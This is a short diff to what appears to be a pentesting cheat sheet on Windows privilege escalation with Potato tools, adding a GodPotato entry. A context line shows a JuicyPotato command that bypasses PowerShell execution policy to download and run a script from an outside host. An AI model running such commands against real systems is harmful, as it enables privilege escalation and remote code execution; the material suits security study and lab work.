@@ -56,6 +56,15 @@ c:\Users\Public>JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b909
 c:\Users\Public>JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
 ```  
 {% endtab %}
+
+{% tab title="GodPotato" %}
+Based on the history of Potato privilege escalation for 6 years, from the beginning of RottenPotato to the end of JuicyPotatoNG, I discovered a new technology by researching DCOM, which enables privilege escalation in Windows 2012 - Windows 2022, now as long as you have "ImpersonatePrivilege" permission. Then you are "NT AUTHORITY\SYSTEM", usually WEB services and database services have "ImpersonatePrivilege" permissions. - [GodPotato](https://github.com/BeichenDream/GodPotato)
+
+```bash
+GodPotato -cmd "cmd /c whoami"
+```
+
+{% endtab %}
 {% endtabs %}
 
 ### SeAssignPrimaryPrivilege
